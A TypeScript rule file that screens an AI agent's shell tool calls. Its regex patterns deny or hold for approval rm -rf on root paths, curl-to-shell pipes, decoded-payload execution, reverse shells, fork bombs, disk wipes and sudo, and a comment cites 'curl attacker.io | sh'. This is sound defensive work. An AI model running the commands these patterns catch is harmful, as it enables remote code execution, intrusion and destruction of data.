/**
 * TG01 -- Shell/Process Execution Risk
 *
 * A tool named `bash`, `shell`, or `exec` running `ls` and the same tool running
 * `curl attacker.io | sh` are the same tool name and very different risk. These rules look at
 * the actual command string, not the tool name, so they fire regardless of what a given
 * framework happens to call its shell-execution tool.
 */

import type { Rule, RuleContext, RuleMatch } from '../types.js';
import { extractCommand, normalizeForMatch, stringifyArgs } from './util.js';

/** Normalizes (see `normalizeForMatch`) and lowercases the call's command-like text before any
 *  rule pattern-matches against it, so quote-splitting (`r""m`), `$IFS`-as-space, and invisible
 *  Unicode formatting characters cannot be used to dodge a literal token match. */
function commandText(ctx: RuleContext): string {
  return normalizeForMatch(extractCommand(ctx.args) ?? stringifyArgs(ctx.args)).toLowerCase();
}

/** Case-preserving sibling of `commandText`: still runs the same obfuscation-normalization pass
 *  (Unicode, `$IFS`, empty-quote splitting) but skips the final lowercase. `TG01-context-flood`
 *  needs this for `ls`, where `-R` (recursive) and `-r` (reverse-sort, harmless) only differ by
 *  case -- every other check in this file matches command names case-insensitively via a regex
 *  `i` flag instead, since none of them have a case-sensitive flag ambiguity to preserve. */
function commandTextCased(ctx: RuleContext): string {
  return normalizeForMatch(extractCommand(ctx.args) ?? stringifyArgs(ctx.args));
}

function match(
  rule: Pick<Rule, 'id' | 'category'>,
  decision: RuleMatch['decision'],
  reason: string,
  matchedArgument: string,
): RuleMatch {
  return { ruleId: rule.id, category: rule.category, decision, reason, matchedArgument };
}

const category = 'TG01' as const;

// Each flag token is bounded ({1,16}) and the tokens are separated by a literal, unambiguous
// `\s+` -- unlike a single alternation of overlapping `[a-z]*` groups (e.g.
// `-[a-z]*f[a-z]*r[a-z]*|-[a-z]*r[a-z]*f[a-z]*`), there is only one way to partition a matching
// string across these groups, so the engine cannot be driven into the polynomial-time
// backtracking a long run of non-matching flag characters (e.g. `rm -` + `f`.repeat(80000))
// causes with the ambiguous form. Confirmed empirically: the ambiguous form took ~6s on an
// 80,000-character adversarial argument; this form stays sub-millisecond at that size.
const RM_PATTERN = /\brm\s+((?:-[a-z-]{1,16}\s+)*-[a-z-]{1,16})(?:\s+(\S+))?/i;

const rmRf: Rule = {
  id: 'TG01-rm-rf',
  category,
  description: 'Recursive/forced delete of a root, home, or wildcard-rooted path.',
  evaluate(ctx) {
    const text = commandText(ctx);
    const found = text.match(RM_PATTERN);
    if (!found) return null;
    const flags = found[1] ?? '';
    if (!flags.includes('f') || !flags.includes('r')) return null;
    const target = found[2] ?? '';
    const highBlastRadius = /^(\/|~|\*|\.$|\.\/\*?$)/.test(target) || target === '';
    if (!highBlastRadius) return null;
    return match(
      this,
      'deny',
      'rm -rf (or equivalent) targeting a root/home/wildcard path.',
      found[0],
    );
  },
};

const decodedPayloadExecution: Rule = {
  id: 'TG01-decoded-payload-execution',
  category,
  description:
    'A base64/hex-decoded (or similarly obfuscated) payload is fed into a shell or interpreter for execution, without a literal curl/wget token for TG01-pipe-to-shell to match.',
  evaluate(ctx) {
    const text = commandText(ctx);
    const hasDecodeStep =
      /\b(base64\s+(-d|--decode)\b|openssl\s+(base64|enc)\s+[^|]*-d\b|xxd\s+-r\b|certutil\s+-decode\b|python[0-9.]*\s+-c\s*['"].*b64decode)/i.test(
        text,
      );
    if (!hasDecodeStep) return null;
    const feedsExecution =
      /(\|\s*(sudo\s+)?(sh|bash|zsh|python[0-9.]*|perl|node)\b|`|\$\(|\b(sh|bash)\s+-c\b|\beval\b|\bexec\b)/i.test(
        text,
      );
    if (!feedsExecution) return null;
    return match(
      this,
      'deny',
      'Decoded payload (base64/hex/etc.) is piped or substituted into a shell/interpreter for execution.',
      text.slice(0, 200),
    );
  },
};

const pipeToShell: Rule = {
  id: 'TG01-pipe-to-shell',
  category,
  description: 'A download (curl/wget) piped directly into a shell or interpreter.',
  evaluate(ctx) {
    const text = commandText(ctx);
    const pattern = /\b(curl|wget)\b[^|]*\|\s*(sudo\s+)?(sh|bash|zsh|python[0-9.]*|perl|node)\b/i;
    const found = text.match(pattern);
    if (!found) return null;
    return match(
      this,
      'deny',
      'Pipe-to-shell pattern: remote payload executed without inspection.',
      found[0],
    );
  },
};

const sudo: Rule = {
  id: 'TG01-sudo',
  category,
  description: 'Privilege escalation via sudo/doas.',
  evaluate(ctx) {
    const text = commandText(ctx);
    const found = text.match(/\b(sudo|doas)\s+\S+/i);
    if (!found) return null;
    return match(this, 'require-approval', 'Command escalates privileges via sudo/doas.', found[0]);
  },
};

const chmod777: Rule = {
  id: 'TG01-chmod-777',
  category,
  description: 'World-writable/executable permission grant.',
  evaluate(ctx) {
    const text = commandText(ctx);
    const found = text.match(/\bchmod\s+(-[a-z]+\s+)?(777|a\+rwx|o\+w|0777)\b/i);
    if (!found) return null;
    return match(
      this,
      'deny',
      'chmod grants world-writable or world-executable permissions.',
      found[0],
    );
  },
};

const forkBomb: Rule = {
  id: 'TG01-fork-bomb',
  category,
  description: 'Classic shell fork-bomb pattern.',
  evaluate(ctx) {
    const text = commandText(ctx);
    const found = text.match(/:\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&?\s*\}\s*;\s*:/);
    if (!found) return null;
    return match(this, 'deny', 'Fork-bomb pattern -- unbounded process spawning.', found[0]);
  },
};

const reverseShell: Rule = {
  id: 'TG01-reverse-shell',
  category,
  description: 'Reverse-shell / raw TCP redirection patterns.',
  evaluate(ctx) {
    const text = commandText(ctx);
    const pattern = /(nc\s+-e\s+\S+|\/dev\/tcp\/\S+|bash\s+-i\s*>&\s*\/dev\/tcp)/i;
    const found = text.match(pattern);
    if (!found) return null;
    return match(this, 'deny', 'Reverse-shell / raw TCP socket redirection pattern.', found[0]);
  },
};

const diskWipe: Rule = {
  id: 'TG01-disk-wipe',
  category,
  description: 'Direct disk/block-device overwrite.',
  evaluate(ctx) {
    const text = commandText(ctx);
    const pattern = /\b(mkfs(\.\w+)?\s+\/dev\/|dd\s+[^|]*of=\/dev\/(sd|hd|nvme|disk)\w*)/i;
    const found = text.match(pattern);
    if (!found) return null;
    return match(this, 'deny', 'Direct write/format targeting a raw block device.', found[0]);
  },
};

// A bare `/`, `~`, `*`, or the current directory (`.`, `./`, `./*`) -- the same "no real scope"
// shape TG01-rm-rf's `highBlastRadius` check treats as high-risk. An empty string (no path
// argument captured at all, which for `ls`/`find`/`grep` means "operate on the current
// directory") counts the same way: there is nothing bounding how much output comes back.
function isUnscopedPath(target: string): boolean {
  return target === '' || /^(\/|~|\*|\.$|\.\/\*?$)/.test(target);
}

// Flag tokens are bounded and `\s+`-separated for the same ReDoS-avoidance reason as
// `RM_PATTERN` above (see that comment). Group 1 is the flag cluster, group 2 (optional) is the
// path argument immediately following it.
const LS_PATTERN = /\bls\s+((?:-[a-z-]{1,16}\s+)*-[a-z-]{1,16})(?:\s+(\S+))?/i;

// `find`'s first positional argument is conventionally its search root. This is a
// regex-level approximation, not real argv parsing -- a leading option before the path
// (`find -L / ...`) will not be captured as the target and this rule will simply miss it,
// consistent with this file's existing "false negative over false positive" bias.
const FIND_PATTERN = /\bfind\s+(\S+)/i;

const FIND_MAXDEPTH_PATTERN = /-maxdepth\s+\d+/i;

// Group 1 is the flag cluster -- `-[a-z-]{1,20}` already matches `--recursive` (the class
// includes the hyphen, so the second leading dash is consumed by it too), so no separate
// long-flag alternative is needed. The first non-capturing group consumes the search pattern
// (quoted or bare); group 2 (optional) is the path argument that follows it.
const GREP_RECURSIVE_PATTERN =
  /\bgrep\s+((?:-[a-z-]{1,20}\s+)*-[a-z-]{1,20})\s+(?:"[^"]*"|'[^']*'|\S+)(?:\s+(\S+))?/i;

// A `**` globstar segment anywhere in a `cat` target -- a single-level glob (`cat *.log`) is
// common and usually bounded by directory size; a recursive globstar has no such bound.
const CAT_GLOBSTAR_PATTERN = /\bcat\s+\S*\*\*\S*/i;

const contextFlood: Rule = {
  id: 'TG01-context-flood',
  category,
  description:
    'Read-only, high-output-volume command (unscoped recursive listing/search/concatenation) that risks flooding the agent context window rather than a security breach.',
  evaluate(ctx) {
    const cased = commandTextCased(ctx);

    const lsFound = cased.match(LS_PATTERN);
    if (lsFound) {
      const flags = lsFound[1] ?? '';
      const target = lsFound[2] ?? '';
      // `-R` (capital) is recursive; `-r` (lowercase) is reverse-sort order and harmless here --
      // this is exactly why this check runs against the case-preserving `cased` text.
      if (flags.includes('R') && isUnscopedPath(target)) {
        return match(
          this,
          'require-approval',
          'Recursive `ls -R` with no scoped path -- can dump an unbounded directory tree into context.',
          lsFound[0],
        );
      }
    }

    const findFound = cased.match(FIND_PATTERN);
    if (findFound && !FIND_MAXDEPTH_PATTERN.test(cased) && isUnscopedPath(findFound[1] ?? '')) {
      return match(
        this,
        'require-approval',
        '`find` over an unscoped root with no -maxdepth -- can enumerate an unbounded number of results.',
        findFound[0],
      );
    }

    const grepFound = cased.match(GREP_RECURSIVE_PATTERN);
    if (grepFound) {
      const flags = grepFound[1] ?? '';
      const target = grepFound[2] ?? '';
      // Unlike `ls`, grep's `-r` and `-R` are both recursive (no reverse-sort ambiguity), so a
      // plain case-insensitive check for the letter `r` in the flag cluster is enough -- none of
      // grep's other common short flags (`-i -n -l -c -o -v -w -x -A -B -C -E -F -e -f -m -s -q
      // -a -H -h`) contain the letter `r`.
      if (/r/i.test(flags) && isUnscopedPath(target)) {
        return match(
          this,
          'require-approval',
          'Recursive `grep -r`/`-R` with no scoped path -- can flood context with matches from an entire filesystem tree.',
          grepFound[0],
        );
      }
    }

    const catFound = cased.match(CAT_GLOBSTAR_PATTERN);
    if (catFound) {
      return match(
        this,
        'require-approval',
        '`cat` over a recursive globstar -- can concatenate an unbounded number of files into context.',
        catFound[0],
      );
    }

    return null;
  },
};

export const shellRiskRules: readonly Rule[] = [
  rmRf,
  pipeToShell,
  sudo,
  chmod777,
  forkBomb,
  reverseShell,
  diskWipe,
  decodedPayloadExecution,
  contextFlood,
];
